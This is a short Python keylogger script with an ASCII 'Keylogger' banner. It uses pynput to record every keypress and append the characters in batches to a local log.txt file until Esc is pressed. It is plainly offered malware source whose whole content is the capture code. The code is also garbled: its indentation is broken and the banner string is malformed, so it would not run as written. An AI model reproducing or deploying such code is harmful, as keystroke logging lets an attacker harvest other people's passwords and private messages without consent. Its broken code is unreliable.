import pynput
from pynput.keyboard import Key, Listener
import colorama
from colorama import Fore, Back, Style

print(
        
         """ + Any Key +


                             
 | |/ /         | |                            
 | ' / ___ _   _| | ___   __ _  __ _  ___ _ __ 
 |  < / _ \ | | | |/ _ \ / _` |/ _` |/ _ \ '__|
 | . \  __/ |_| | | (_) | (_| | (_| |  __/ |   
 |_|\_\___|\__, |_|\___/ \__, |\__, |\___|_|   
            __/ |         __/ | __/ |          
           |___/         |___/ |___/           

        """ + Fore.RESET)
print()
print()





count = 0
keys = []


                                def on_press(key):
                                    global keys, count

                                    keys.append(key)
                                    count += 1

                                    if count >= 10:
                                        count = 0
                                        write_file(keys)
                                        keys = []


                                        def write_file(keys):
                                            with open("log.txt", "a") as f:
                                                for key in keys:
                                                    k = str(key).replace("'", "")
                                                    if k.find("space") > 0:
                                                        f.write('\n')
                                                    elif k.find("Key") == -1:
                                                        f.write(k)


                                        def on_release(key):
                                            if key == Key.esc:
                                                return False


                                        with Listener(on_press=on_press, on_release=on_release) as listener:
                                            listener.join()
